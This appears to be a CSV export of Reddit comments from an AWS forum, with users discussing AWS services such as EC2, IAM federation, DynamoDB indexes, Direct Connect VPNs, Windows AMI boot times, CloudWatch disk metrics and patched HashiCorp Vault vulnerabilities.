g7zery9,j6f58g,"&gt;when you knew that AWS was the right set of tools for your path?

when i had to use azure",10.0
g819bvm,j6f58g,Funny!,1.0
g7yo6dd,j6f58g,"I feel there is not 1 moment but a series of moments. Here's my list in chronological order:

1) Able to spin up a server (ec2) in a couple of minutes rather than filling out a pile of paper work, wait for it to get approved, then wait another 2 week for the infrastructure team to create it, then spend another week debugging on why it didn't work.

2) Instead of creating the ec2 server, create a docker image and have fargate do everything else for me.

3) Skip the server and use API Gateway / Lambda instead.

Sprinkle in some DynamoDb, S3, Infrastructure as Code (CloudFormation or Terraform), it blows my mind what you can build!",9.0
g7yt54x,j6f58g,"Hard to pick one, but if I have to pick one... I was working at a firm with a really slow IT department. Lead time on delivery and installation of new physical servers was &gt;3 months. My project had to launch in a month. I got an exemption to use AWS ""temporarily"", so I was able to spend that month writing code rather than desperately begging for existing server capacity from other projects.

OK, not a great moment of revelation and not a technical tour de force. But it really made me want to never go back to 3-6 month cycles to get someone else to install some physical boxes when I could just script it up and have it in minutes.",5.0
g7zf28q,j6f58g,"Connecting s3 to cloudfront, with a WAF firewall +cname with a certificate from certificate manager, which in turn came from route53",3.0
g7zlgj1,j6f58g,When EC2 went into beta and I spun up an instance from a command line.,3.0
g7znxae,j6f58g,When I started using IaC,3.0
g7yt8os,j6f58g,"* Multi-AZ RDS
* how network-attached storage (EBS) allows so much flexibility
* CloudFront",2.0
g7z1kkp,j6f58g,"Cloudforming a processing pipeline using Kinesis Firehose, Lambda, Elasticsearch, EC2 hosting Neo4j.  All pretty simple.",2.0
g7zeoil,j6f58g,"I had this moment with IAM where everything just clicked. 

It was like learning to drive a manual car, and after being yelled at by my dad for 6 months, I suddenly stopped burning out the clutch on hill starts on my mother's 1995 Holden barina.

More recently, introducing step functions  into my automation workflows.",2.0
g819hyx,j6f58g,Much like driving manual it sticks with you!,2.0
g80g346,j6f58g,"I was in my senior year of college for IT in 2011; I was very well trained for full-stack development by my professors at the time. I enjoyed programming more than anything but I also loved building servers, setting up databases, working with Linux, etc.

One of the last courses I took was an advanced DB architecture course. The professor handed each student a code for a $100 credit for an AWS account and instructions for using the shared AMI he had created to do the coursework in EC2.

After spinning up an EC2 instance for the first time, my mind was immediately blown. That I can pay by the hour for a completely custom linux VM, blow them away and make new ones at a click of a button. Hated VPS services, hated working with hardware... this was my dream.

I was completely sold right then, and still am! Now I hate EC2 though, managed services and serverless only for me now :)",2.0
g81aecy,j6f58g,Great story,2.0
g7yaasc,j6gehe,"Any insights / thoughts on a 3rd party developer using Wavelength? The blog describing at a high level but wondering,

* How is it different onboard sensors on a vehicle? Most new vehicles comes with onboard devices thus eliminating external communications (thus dependancies / failure points / latency)
* When we are talking about ""emergency brake lights ahead, collisions, and blind spots"", and given the safe distance time required for a car going at 40miles take \~1.888 seconds. Not sure how much impact WL has on it vs Onboard sensors vs LTE network / 5G Network with cloud
* Finally, when they mention compliance to US, EU standards and exchanging the sensor data with others - any details on that?

Curious to find a bit more details.",2.0
g7z3rw1,j6gehe,Man having a use case for that low of latency seems crazy. Edge at Verizon makes that much of a difference? Speed trap in 5 miles can arrive at the car in 0.1 sec or 0.5? Fiber between data centers is too slow?,1.0
g7z3sln,j6gehe,5 miles is 8.05 km,1.0
g833ui7,j6gw7s,"It's not useful at all in this case. Typical with AWS, release early, release often. They may add support for the latest version at aater stage.",2.0
g7z8s4g,j6ga4c,DDoSaaS?,27.0
g7zvpoi,j6ga4c,That’s an Indian dish! I’m sure of it!,5.0
g7zej26,j6ga4c,Can we use it to load test itself?,5.0
g808cak,j6ga4c,Only if your willing to pay the bill.,3.0
g7zjru8,j6ga4c,Literrally just built myself dockerized  artillery script yesterday and create a simple script to deploy them as fargate task.,2.0
g800emx,j6ga4c,"Eh, Probably will save you a little bit of money doing it with your script. Plus you can say you built it yourself on your resume when applying to AWS 😁",5.0
g7zuz7n,j6ga4c,"It's an interesting solution. However I'd question the value compared to using an external provider (we've used [Redline13](http://www.redline13.com/) for example) which spins up instances, runs the tests and produces the results for you. Yes you have to pay for the external service, but it saves a lot of time.",1.0
g7zz14u,j6ga4c,"If you want to load test an internal-only service, this may be a better match.",1.0
g81dje3,j6ga4c,Good point - it does have an advantage there. I'd still use an external service where I could I think over this. But agree it might be useful for internal service testing.,2.0
g81m4zw,j6ga4c,That goes for most services AWS provides I guess. CodeCommit compared to GitHub for example is a joke. But if it suits your needs it will definitely be cheaper than using the comparatively better external solution.,1.0
g8299bx,j6ga4c,"Sure, it's like EMR, etc. where it's like ""well, I don't have to launch systems so I guess it's worth it until I need something better"".",2.0
g7z9viz,j6ga4c,"What’s the bill on this for the infra alone? Maybe wrong, but almost seems designed to maximize it.",1.0
g7za4w9,j6ga4c,"I mean, almost all of those services are pay-per-use. API gateway is cents until you get to huge scales. lambda for this solution is going to be so far inside the free tier, and once it's not it would be maybe a cent or two a month? Cognito is free for the first 50,000 users, so long as you have less than 50,000 employees making logins and using it that should be free too.

Fargate costs some money, and honestly is the only real thing that costs more than a cent or so a month in this architecture, but it seems to only spin it up to run the tests then shut it down. SO that seems pretty good too.

What makes you think it's designed to maximize costs?",9.0
g7zaann,j6ga4c,Yeah you’re right - I just glanced at the diagram and thought it looked like a lot of unexpected pieces.,1.0
g7zsatf,j6ga4c,"API GW is still super expensive, I spend around $500 a month between Lambda and API GW, they’re both over priced, especially considering Lambda could have been WASM like CF’s isolates",1.0
g7zecg2,j6ga4c,"If you want to use Cognito with your SaaS app that has millions of users, it's quite expensive. Start getting over 10k req/sec and API Gateway may bankrupt your startup. It's far less expensive to roll your own solutions. These aren't huge scales, considering these kinds of loads can be run on a single modern CPU if you write efficient code.",0.0
g80a0ii,j6ga4c,"These managed services work great if your SaaS doesn’t have a free tier. If you had 1 million paying customers, each paying $10/month, then Cognito will cost you about $5000 from your $10 million monthly budget. At that point the cost is negligible. However if you had 1 million free users, then costs add up quick with no budget to offset.",2.0
g80b0ou,j6ga4c,"There is also the case where the product isn't free, but isn't billed by user. Not every product can extract a lot of value per user to make the Cognito cost per user insignificant.",1.0
g82sxp0,j6ga4c,"Remember, some of these companies on AWS have RTO/RPO in the millions. The cost is probably well worth it for them.",1.0
g837qdf,j6ga4c,"Probably true. First glance just made me think damn, why does this need all of this. Won't most companies have their own image build pipelines already? And why CloudFront? But as previously pointed out many of these are billed per-use, not exactly how I initially perceived it.",1.0
g7yfk0l,j6fwy6,"It depends on your use-case. For most things, scaling up at 20% might be wasteful. For compute bound stuff, I have generally seen performance (latency, error codes) starting to degrade &gt;=50-70% utilization. The best way to figure out would be setup good observability and track these things.",2.0
g7ygxb3,j6fwy6,"Thanks! My app does most of the heavy lifting/calculations. The rds is simply for read/writes; very basic crud statements. During my initial testing (just me, 1 user) cpu barely spiked higher than 2%.",1.0
g7y97qh,j6fwy6,"It's kind of up to you. Decide what level of performance you can tolerate, and then figure out what you need to provide that. I'm usually looking for sme response rate, or requests per second that I want to support.

Some of my stuff is CPU bound processing, and it sits at 100% CPU most of the day. In that case, CPU usage isn't a interesting metric. Maybe in your case it is. You'll have to find the metrics that you want to optimize, and then the metrics that you can measure that tell you about the metrics you want to optimize.",1.0
g7y9dgn,j6fwy6,I’d say response time is what I’m after. Is there a metric for that?,1.0
g7y9w1q,j6fwy6,"If you are using a ELB/ALB then you can get web request latency from cloudwatch.

Since we're talking about RDS, you might be able to turn on RDS performance insights.

Otherwise you'll have to instrument your code to get DB timing. If you're interested in the web request response times you could also analyze your web server logs. (Nginx, Apache, etc logs)",1.0
g7y1r06,j6dy1s,"Can I restate your question to make sure I understand:
""Since on-demand pricing means you don't have to worry about capacity provisioning for tables *or indexes* anymore, does this mean there's now no disadvantage from having multiple, non-overlapping sparse GSIs instead of one GSI that would merge different sub collections""

That correct?

If so, I'd say yes, you're right. The same amount of write capacity would be needed (provided the GSIs are genuinely non-overlapping, as indexes don't get written to if the corresponding secondary key isn't present on a given item) and even could be reduced since you may be able to be more selective with what columns you project into each GSI, rather than the superset of needed attributes with the overloading pattern.

The risks as I see them are:

* It does lock you into the more expensive on-demand model. If you were to stabilize your table needs and want to reduce your read/write costs by switching to provisioned, that path would be a lot more expensive than the overloading pattern.

* The overloading pattern is very generic and removes any operational need to wrangle GSIs each time you want to add or remove an access pattern. Conversely, if you're in an environment where it's a bit headachey to roll out things like GSI changes (because say you're in a large org where there's process around AWS resource configuration), you may want to go with the overloading approach (which is an argument that parallels a lot of the original motivations for the schemaless vs schema'ed DB debate)...",3.0
g7zhapz,j6dy1s,"A brilliant answer, thank you very much!",1.0
g7y9wwh,j6di1h,"If this is just normal SSH, it should just work. The client should be reporting some sort of error message, eventually. The fact the client is misbehaving and that you can use the standard SSH client and connect fine suggests it's something screwy with the client.

Look for debug options you can enable to get more detail on your client, and check on the remote side's `netstat` or SSH logs to see if the inbound connection is seen at all.",1.0
g7xx5n7,j6c7r0,"There are a number of NAS filer options in the AWS marketplace, may want to ping folk like SoftNAS etc/  to see if their NFSv4 implementation includes ACL support. I'd maybe start first looking at marketplace options before rolling my own NFS server. 

[weka.io](https://weka.io) has ACL support but you generally run their parallel fs client in most cases and they can be spendy at small scale",1.0
g804n5g,j6c7r0,Hm I haven't tried using a product like this before in AWS but it sounds like a good option. Would you recommend a NAS solution over running NFS on EC2?,1.0
g7xyw3s,j6c7r0,"If it requires ACL, is S3 an option?",1.0
g7zzkgg,j6c7r0,Is there a way to have an s3 bucket present as an NFS mount with ACL support?,1.0
g80fbz5,j6c7r0,"Nah, not to my knowledge. That driver would void the ACL like action.  
  
It seems [someone else was asking the same thing](https://forums.aws.amazon.com/thread.jspa?threadID=299153) a year ago. And Amazon replied with a ""this is not supported, your business is important to us"" message.",1.0
g7y52vb,j6cuqj,You don’t create a transit VIF. You create a public VIF and then build site to site VPNs over that VIF which terminate into your TGW. Set the VPNs up correctly and you get ECMP and redundancy across multiple DXs and multiple DX facilities.,4.0
g7z60j1,j6cuqj,Thank you for your response. This was my initial suggestion but it wasn’t well received because they don’t want to go over public internet. I have to mention also that all workload is behind a transit gateway.,1.0
g7zov0b,j6cuqj,It doesn’t really go over the public internet. The only routes you receive from a Public VIF are the routes for public AWS services. So your VPN over public VIF will remain within the AWS backbone and never actually hit the public internet.,2.0
g80ket2,j6cuqj,"Thanks for this. I will revisit this option. 
Have a pleasant day.",1.0
g7y4y34,j6cuqj,"what kind of traffic is going over? You could just encrypt that, say using SSL. It depends what you’re doing obviously.",1.0
g7z61z6,j6cuqj,Traffic between on-prem and vpcs behind a transit gateway.,1.0
g7xy0x6,j6cuqj,"This is one way:
https://aws.amazon.com/premiumsupport/knowledge-center/create-vpn-direct-connect/",0.0
g7z650r,j6cuqj,Thanks for this. How does this change if the connection is for a transit gateway and not directly to a vpc. Also remember you can only have one type of VIF for a hosted connection.,1.0
g83nxbi,j6cuqj,"Sorry, missed the intent of your question.  Do you mean like https://docs.aws.amazon.com/whitepapers/latest/aws-vpc-connectivity-options/aws-direct-connect-aws-transit-gateway-vpn.html shows?",2.0
g866dp9,j6cuqj,Yes this is one of the other options AWS suggested. Ended up going with the transit vpc for vpn over DX,1.0
g7xpxpm,j6d3v7,Stop using Windows :P  It boots up so slow.,7.0
g7xriej,j6d3v7,"LOL. Yeah thanks :) I suspect we may well move to a different platform at some point, but for now we are where we are. We have such a huge investment in this platform.",1.0
g7xrnrp,j6d3v7,"Yeah I was there too.  Basically bake as much into the AMI as you can, so it has to do as minimal configuration as possible on boot.",3.0
g7y2wnb,j6d3v7,"Yeah, this \*10000. It seems you're boned because it has to join the domain so it'll never be ""fast"", but if you name an AMI that's ready to go and just has to finish joining the domain it'll speed way up.

&amp;#x200B;

Making an AMI using AWS image builder or hashicorp packer is not too difficult.",1.0
g7y0nps,j6d3v7,"we use windows/IIS and it just a pig, and damn slow. You're also not helping by adding a bunch of additional processing after instance spin-up.  Like /u/2fast2nick mentioned, try to bake as much of this into your AMI.",5.0
g7zegyw,j6d3v7,"used to feel your pain - sysprep is a silly requirement in this day and age of autoscaling imo. ms should release a server version that doesnt require it. if you arent joining a domain, you dont need the uniqueness /rant

anywho, region settings can be baked in to the ami - what other userdata are you running? for webdeploy, have you thought of baking ami's with the version of the code you want to deploy already on it, and then updating your asg to point to the new ami?",1.0
g7zfggv,j6d3v7,"Yeah, I have questioned several times whether those servers should be domain joined. I am not sure what we are actually getting from that besides a little bit of GPO which we could apply in other ways.

The userdata is mostly the domain join, latest code content, certificates (it is local, not on an LB), and enabling ps remoting. You are right though, I think we need to look again at what else we can include in the AMI. It might not make huge changes, but sometimes even a couple of minutes can make a difference.",1.0
g7zmb8p,j6d3v7,"&gt;Yeah, I have questioned several times whether those servers should be domain joined.

yeah if they dont need domain joining, that at the very least the time it takes to reboot, saved. if they need to access resources protected by windows perms, app pools can be given local accounts that match with domain accounts iirc - they pass those creds on when challenged, and it worked ok for windows shares.

&amp;#x200B;

&gt;certificates (it is local, not on an LB)

see if you can change this too

&amp;#x200B;

&gt;enabling ps remoting

this should be able to be baked in",2.0
g7zmm45,j6d3v7,"Yeah, if we change the certificate location, at least we can get ACM to manage those. We are spending waaaayyyy too long manually renewing and applying certificates at the moment.",1.0
g7zijfm,j6d3v7,"Are you able to time how long each piece takes? That’ll atleast help focus on the areas that take the longest, and avoid areas where you may not have any control over and/or not much benefit would be gained.",1.0
g7zk6jo,j6d3v7,"Thanks. Yeah that is something definitely on the the list. There isn't any real logging going on with the scripts that are called at the moment, so from troubleshooting if nothing else, that is something that needs to be worked on!",1.0
g7z2205,j6cmb0,"For people who only read the headline or skip the intro: 

&gt;Both vulnerabilities (CVE-2020-16250/16251) were addressed by HashiCorp and are fixed in Vault versions 1.2.5, 1.3.8, 1.4.4 and 1.5.1 released in [August](https://github.com/hashicorp/vault/blob/master/CHANGELOG.md#151).",7.0
g806z45,j6cmb0,"Importantly, this problem likely impacts other software that perform presigned GetCallerIdentity calls to authenticate to non-AWS services as this general concept, and likely code, has been copied by other projects for this use case.",1.0
g7xwqt3,j6cmb0,This is why I'm so paranoid about using third party services that have such sensitive information. It just adds a whole other threat vector.,10.0
g7y0huy,j6cmb0,"To be fair (and, if i recall correctly) Vault existed before Secrets Manager or Parameter Store by several years.",16.0
g7y2xnb,j6cmb0,"This doesn’t really add a vector - it shifts one. I’ll take this over hardcoded secrets any day...

If AWS offered a similar solution it’d still be down to their implementation - but they really don’t IMO for outside AWS",9.0
g7yensj,j6cmb0,What does vault offer that secrets manager does not?,5.0
g7z3wrw,j6cmb0,"Lots of integration with other services (databases, cloud providers...), various non-AWS authentication backend, K8s integration",6.0
g7zcxmk,j6cmb0,"Secrets manager doesn't come close to what vault provides. Being able to identify identities from many different platforms (k8s, aws, gcp, azure), and issuing temporary credentials for just about anything under the sun (databases, aws, gcp, azure, ad, ldap, ssh). Being able to revoke said credentials on a whim. You're even able to replace e.g. KMS, combines with identities across many platforms, you can achieve just about anything. This doesn't even scratch the surface. Not to mention, even if you use it exactly like secrets manager, at the price secrets manager comes at, you're probably still gonna be better off after the initial investment.",3.0
g80a29e,j6cmb0,"All of this is why, yeah.",1.0
g7y1pmn,j6cmb0,"There's hardly a better place or better service for storing a secret than hashicorp vault.  


There is a missing AWS feature for vending 'dynamic secrets' like vault does.  


That not withstanding, choosing the right secrets manager is a critical infrastructure decision.",2.0
g7yeh0b,j6cmb0,"I'm not really familiar with this space at all. What do you mean by ""dynamic secrets""? Just going by the name I'd expect to be able to use AWS Secrets Manager but I don't really know what it supports or what it's missing.",2.0
g7yezwa,j6cmb0,"I'm not really familiar with this space at all. What do you mean by ""dynamic secrets""? Just going by the name I'd expect to be able to use AWS Secrets Manager but I don't really know what it supports or what it's missing.

Edit: from some of your other recent comments I guess you're talking about temporary tokens? I guess that's something you could probably build using KMS without too much trouble (like encrypting a nonce and timestamp) but I can see how it would be nice to have as a built-in without worrying about getting it wrong, or to also be able to support revocation.",1.0
g7yfwtm,j6cmb0,"Beyond just temp aws creds, but thats the idea. Dynamic secrets is the hashicorp marketing term for keeping long lived secrets hidden and vending short lived secrets.

Like storing an issuing CA private key in vault and vending short lived tls server/client certs. Or hosting a private RSA/EC key for signing jwt tokens, vault can vend the the signed token without revealing the private key.

I wouldn’t be surprised to see aws try to compete a bit with hashicorp here, they do have ACM private cert authority but at least at launch when I demo’d it was missing a fine grain entitlement.

Also I don’t work for hashicorp, I’m just a nerd.",2.0
g7yoii8,j6cmb0,"There’s a difference of mentality as well. With Vault you vend short lived secrets. With Secrets Manager, you rotate secrets accessed by applications directly.

One is a simpler model, the other gives you more flexibility.",4.0
g7yqznj,j6cmb0,"I was thinking about that on the way home, and in some projects we took that approach .Secrets manager lambda talked to our issuing CA and got short lived cert, and dumped it in secrets manager for other processes to pick up later. In this case we also used ACM PCA.",1.0
g7yztyu,j6cmb0,"The AWS native solutions like RDS, Dynamo etc all support IAM.  That uses short term session creds similar too what your describing.

It doesn't work for self hosted on ec2 solutions, but can cover a lot of ground.",1.0
g81h4b4,j6bkbo,"See https://aws.amazon.com/partners/solution-provider/ an you bill your customers directly. You don't have to go trough a distributor to do so.

So your customers get an AWS account, but you create the invoices and have customized AWS terms with them",1.0
g7zj382,j6bkbo,"I work at AWS in Professional Services and have worked with partners from both sides - inside and outside of professional services. But this is way out of my league. 

Go through the official channels. 

https://aws.amazon.com/partners/",0.0
g7x2kmm,j69scr,"s3:ListBucket lists objects in the bucket, but doesn't list the bucket itself.  s3:ListBucket takes action on a bucket type resource.  So in your examples, only #1 is valid.  #2 would not do anything.

If you want users to be able to list out buckets, you would need s3:ListAllMyBuckets.",4.0
g7ynyi9,j69scr,This is the most correct answer.  Note that in a bucket policy ListAllMyBuckets would be ineffective.  Bucket policies can only apply to the bucket they are assigned to.  If there is a reference to any other bucket it wouldn’t grant any access,1.0
g7x2qcj,j69scr,"ListBucket deals with listing objects in a bucket, I believe these policies will have the same effect. (Keep in mind the '*' will let them list objects in any bucket that starts with the name '
my_bucket_name'

In terms of a user ""seeing"" the existence of a bucket(s) you usually want the user to have ""ListAllMyBuckets"" and ""GetBucketLocation"" permissions tired to their IAM user/principal, not on the bucket policy itself.",2.0
g7xcym4,j69scr,[deleted],-2.0
g7xgp50,j69scr,Bad guess. Never guess with IAM policies.,4.0
g7x5f3v,j69eve,"Stackoverflow answer: https://stackoverflow.com/questions/37441225/how-to-monitor-free-disk-space-at-aws-ec2-with-cloud-watch-in-windows

{ ""Id"": ""PerformanceCounterDisk"", ""FullName"": ""AWS.EC2.Windows.CloudWatch.PerformanceCounterComponent.PerformanceCounterInputComponent,AWS.EC2.Windows.CloudWatch"", ""Parameters"": { ""CategoryName"": ""LogicalDisk"", ""CounterName"": ""% Free Space"", ""InstanceName"": ""C:"", ""MetricName"": ""FreeDiskPercentage"", ""Unit"": ""Percent"", ""DimensionName"": ""InstanceId"", ""DimensionValue"": ""{instance_id}"" } }

Change c: to e:",1.0
g7x6cp5,j69eve,"Already did that, was my first guess. My AWS.EC2.Windows.CloudWatch.json file has:
      
     ""FullName"": ""AWS.EC2.Windows.CloudWatch.PerformanceCounterComponent.PerformanceCounterInputComponent,AWS.EC2.Windows.CloudWatch"",
        ""Id"": ""PerformanceCounterDisk"",
        ""Parameters"": {
          ""CategoryName"": ""LogicalDisk"",
          ""CounterName"": ""% Free Space"",
          ""DimensionName"": ""InstanceId"",
          ""DimensionValue"": ""{instance_id}"",
          ""InstanceName"": ""C:"",
          ""MetricName"": ""FreeDiskPercentage"",
          ""Unit"": ""Percent""
        }
      },
         {
        ""FullName"": ""AWS.EC2.Windows.CloudWatch.PerformanceCounterComponent.PerformanceCounterInputComponent,AWS.EC2.Windows.CloudWatch"",
        ""Id"": ""PerformanceCounterDiskTempDB"",
        ""Parameters"": {
          ""CategoryName"": ""LogicalDisk"",
          ""CounterName"": ""% Free Space"",
          ""DimensionName"": ""InstanceId"",
          ""DimensionValue"": ""{instance_id}"",
          ""InstanceName"": ""E:"",
          ""MetricName"": ""FreeDiskPercentage"",
          ""Unit"": ""Percent""
        }
      }

WIth the addition of the flows:

       ""Flows"": {
      ""Flows"": [
        ....
        ""(ApplicationEventLog,SystemEventLog),CloudWatchLogs"",
        ""(PerformanceCounterDisk, PerformanceCounterDiskTempDB),CloudWatch""
      ]


I have monitors and alerts on C: but nothing on E. I go to cloudwatch and check alarms and I have insufficient data points.

&gt;NonRootUsage
&gt;NonRootUsage &gt; 85 for 2 datapoints within 10 minutes",1.0
g7x6gh1,j69ki8,"A Lambda Layer is ZIP that contains a library and then that is copied into the /opt directory of the execution environment of that Lambda. My interpretation is that it is a copy with every Lambda.

[https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html)",5.0
g7xfwdv,j69ki8,"Yes, in fact if you delete a layer, the lambda that uses it will keep working",1.0
g7xrqt9,j69ki8,Copy would probably be too slow. I imagine it's a union fs.,1.0
g7x6efn,j69ki8,It is similar to Docker image inheritance. Lambda is build on Firecracker which is a Docker scheduler,1.0
g7x7vkk,j69ki8,Behind the scenes it's likely the filesystem where the artifact lives is mounted as a read only for every lambda invocation. Only \`/tmp\` is writable unless you are using [EFS](https://aws.amazon.com/blogs/aws/new-a-shared-file-system-for-your-lambda-functions/).,1.0
g7xhfrq,j69ki8,Unrelated but: how do you add the dependency?,1.0
g7xp0ct,j69ki8,"Uploaded a zip file through the GUI is how I did it.

GUI interface should be on your Lambda sidebar.

This is the zip i used: [https://github.com/shelfio/chrome-aws-lambda-layer/blob/master/chrome\_aws\_lambda.zip](https://github.com/shelfio/chrome-aws-lambda-layer/blob/master/chrome_aws_lambda.zip)",1.0
g7xzmu4,j698gt,"Assuming you are running with a reasonably new firmware, you actually can use the Registration Code from WorkSpaces where the address is supposed to go in the zero clients (and the software-based PCoIP Client as well). This should give you the result you are looking for. It does require you to use MFA with your WorkSpaces, but this is something you should be doing as best practice.",1.0
g803ji0,j698gt,"This does not work, as stated above, the AWS direct connect does not support the ability for hardware to read CAC cards unless I can find some round about way to make it work.",1.0
g7wzps3,j698gt,"This is what i found  [https://docs.aws.amazon.com/dcv/latest/userguide/using-smartcard.html](https://docs.aws.amazon.com/dcv/latest/userguide/using-smartcard.html)   


 You must be authorized to use this feature. If you are not authorized, the functionality is not available in the client.",0.0
g803kkp,j698gt,I am out of the office today. I will try that tomorrow and update.,1.0
g84g5yg,j698gt,NICE is not on AWS Govcloud unfortunately.,1.0
g7xbz1j,j694as,"In the sample code example. Step 7 says :

Using the Amazon Resource Name (ARN) of the selected role, the proxy uses the credentials of the IAM user to makes an AssumeRole request. 

Which makes me think the IAM user that you use for the initial temp cred creation will be the principal in the trust statement. 

But this is really crazy magic and I have little confidence in that statement!!

It also sounds like you should be able to use an instance role instead of an IAM user, so maybe your instance role would work. There are also bits where they seem to suggest it has to be an IAM user...

My advice, start off trusting your account root. And then anything (user/role) will work. Then manually change it about till it works. Then put the value in your Cloudformation!",2.0
g7xefzd,j694as,"Thanks for response. I will see if I can do the guess and check method but am not hopeful, this customer is a stickler.",1.0
g7xg2pg,j694as,"You could fire up a free aws account on your own credit card, see what works and shut the account down later if you don't have a proper dev environment.

You don't need it to do auth against their endpoints, it just needs to be a bit of code on an instance that pretends to do the auth in the way you want to do it. You can create an endpoint that doesn't even check auth, simply always return the same user id every time you get called. Then the only bit of ""customer"" info in your account is : the permissions to assume the role will use the same type of principal. Which isn't exactly proprietary.

I'm curious enough to have a go myself if I hadn't clocked off work hours ago :)",1.0
g7xjsmf,j694as,I hear you. Maybe I’ll look at our corporate Dev environment if it gets too sticky. Thanks for input,1.0
g7y1z3p,j694as,"IAM is free, all the time. no $ down for experimenting with an Identity provider.",1.0
g7y2nat,j694as,"There's a missing doc - that CUSTOM identity broker, which is AWS IAM.

I am 99% sure it's the same as the saml doc as it is for OpenID with small differences, [https://docs.aws.amazon.com/IAM/latest/UserGuide/id\_roles\_providers\_enable-console-saml.html](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_enable-console-saml.html), but instead you put in the ARN of the openid provider you setup (and don't check the saml attributes either).

However, to test this youself, if you've got the openid provider setup in an account, just go in there and add a role via the console and set it to use your custom web identity provider. Then just look at the policy for that role, and boom.

&amp;#x200B;

It'll look something like this (Caution: I freehanded this on reddit. Syntax not guaranteed)

{ ""Version"": ""2012-10-17"",   ""Statement"": \[{ ""Effect"": ""Allow"",     ""Principal"": {""Federated"": ""arn:aws:iam::ACCOUNT-ID-WITHOUT-HYPHENS:YOUR-OPENID-PROVIDER""},     ""Action"": ""sts:AssumeRoleWithWebIdentity""   }\] }",1.0
g7y345f,j694as,"To elaborate,  custom identity provider basically means you're writing software that has an IAM access key pair and will assume roles for users. Generally ill advised unless you really know what you're doing.",1.0
g7y3m1i,j694as,"That would make some sense - I just don’t have much experience with doing OIDC in AWS IAM. 

Plus the documentation in the link I referenced does not reference OIDC at all -  only API actions it references is AssumeRole so that’s why it made me think OIDC doesn’t play into it. But I’m probably wrong.",1.0
g7y4kx4,j694as,"yeah custom identity broker is a whole other thing - basically you write your own IDP that takes an IAM access key pair and assumes roles on behalf of users, and vends them the credentials. Not generally advised unless you really know what you're doing.

Worth reporting this AWS doc gap.",1.0
g7y7p13,j694as,"I agree 100% and what’s more frustrating their idp supports SAML they just want to go with OAuth. I’m building a case to try to convince them otherwise. 

Am I right to assume that the trust relationship of the role assumed by the users is with the IAM role of the identity broker ?",1.0
g7y9smu,j694as,"No, AWS IAM federated identity is different from normal federation in a SaaS.

The IDP (SAML or OpenID) tells AWS who the user is, and what roles they'll be allowed to pick from - so there is a need to have some sort of entitlement mapping that the IDP can query that tells it what users can pick from what roles, in which accounts.

So for example, say I authenticate to the corporate IDP, it knows i am ""Number9"", it has to ask the entitlement store ""What are the AWS roles number9 gets, in which AWS accounts, and what is the ARN(s) of the IDP's"".

The SAML implementation has the SAML IDP put the roles inside the SAML signed XML doc, the openID connect implementation seems to expect the roles in the query string as per: https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithWebIdentity.html

Example request, look at the RoleARN argument. Honestly if you're looking to direct the company elsewhere, it'd be worth understanding the security implications of this in a corporate scenario because it means an adversary may be able to specify what role they're being direct to assume. It looks to be any role that would trust that OpenID provider.

    https://sts.amazonaws.com/
    ?Action=AssumeRoleWithWebIdentity
    &amp;DurationSeconds=3600
    &amp;ProviderId=www.amazon.com
    &amp;RoleSessionName=app1
    &amp;RoleArn=arn:aws:iam::123456789012:role/FederatedWebIdentityRole
    &amp;WebIdentityToken=Atza%7CIQEBLjAsAhRFiXuWpUXuRvQ9PZL3GMFcYevydwIUFAHZwXZXX
    XXXXXXJnrulxKDHwy87oGKPznh0D6bEQZTSCzyoCtL_8S07pLpr0zMbn6w1lfVZKNTBdDansFB
    mtGnIsIapjI6xKR02Yc_2bQ8LZbUXSGm6Ry6_BG7PrtLZtj_dfCTj92xNGed-CrKqjG7nPBjNI
    L016GGvuS5gSvPRUxWES3VYfm1wl7WTI7jn-Pcb6M-buCgHhFOzTQxod27L9CqnOLio7N3gZAG
    psp6n1-AJBOCJckcyXe2c6uD0srOJeZlKUm2eTDVMf8IehDVI0r1QOnTV6KzzAI3OY87Vd_cVMQ
    &amp;Version=2011-06-15

On reading this it's very clear that OpenID connect and IAM integration is not designed with a corporate environment in mind.",1.0
g7ycgf8,j694as,Thanks for the info- I don’t think I am explaining myself well.,1.0
g81i0rq,j694as,"Custom identity provider would be used if you don't have OAuth. Since you they have OAuth, they have hopefully OIDC and then you can use web identity federation. Either through Cognito or coded with AssumeRoleWithWebIdentity

See https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_oidc_manual.html",1.0
g81ov7p,j694as,"Ok that makes sense - so ideally I would configure the OIDC idP (where the config would be from ec2 based idp/identity broker) and create roles associated with that OIDC idP.  

I wasn't aware that OIDC would work for console access.  Is that something you have done?",1.0
g834kzi,j694as,Ah yeah. Never tried but basically you should be able to exchange the temporary credentials you got from `AssumeRoleWithWebIdentity` for a sign-in token where you then can generate the sign-in URL for the user.,1.0
g7wtnbf,j68q73,Check out metric math expressions.  That should create the new expression you want and you can create an alarm based on that.,4.0
g7xoc96,j67bhu,I think you're supposed to use signed-cookies for multiple parts/files.,0.0
g7y0l4f,j67bhu,what do you mean?,1.0
g7y6ycw,j67bhu,"Instead of generating a pre-signed URL for each part, you use a pre-signed cookie instead that authorizes a client to download/upload multiple files in a session.",0.0
g800xnr,j67bhu,"Sounds interesting,

Do you have a code snippet for that? I'm not sure it can be done",1.0
g808w86,j67bhu,"[Signed Cookies](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-signed-cookies.html).  It's the same thing as a signed URL, the security is built into the cookie you send in the request, not the URL itself.  The advantage is you don't need to generate several pre-signed URLs.",1.0
g81ghe3,j67bhu,"Ok, I wasn't familiar with that but as far as I understand this is a totally different thing.

1. It is only let you access existing files,  multipart upload with signed URLs allows you do upload files by its parts
2. If you want to access existing files and not upload new ones, signed cookies work with CloudFront which means you need to create a bit more complex architecture (domain, CDN, bucket, certificates) then just make a signed URL directly to s3.
3. Signed URL allows you more to be more dynamic with granting access, you can programmatically create it per user.
4. Signed URL works better when working with single files.

Also I found [this](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-choosing-signed-urls-cookies.html)",1.0
g7x742j,j67sds,Creating an issue on the Sam github repo is the best way,1.0
g7x944j,j67sds,"Thank you, I'll try that",1.0
g7wra86,j688u5,"It sounds like you don't really want a spot instance at all. You want to have one instance running at all times, and you reference some users who get annoyed when your service is down. This is not what spot instances are designed for.

If you always want a single instance up at all times, and this is supporting some user-facing interactive service, don't use a spot instance. Consider an RI if you want to save money, but leave the spot instances for stuff where it really is OK for your instance to be yeeted into the void.",7.0
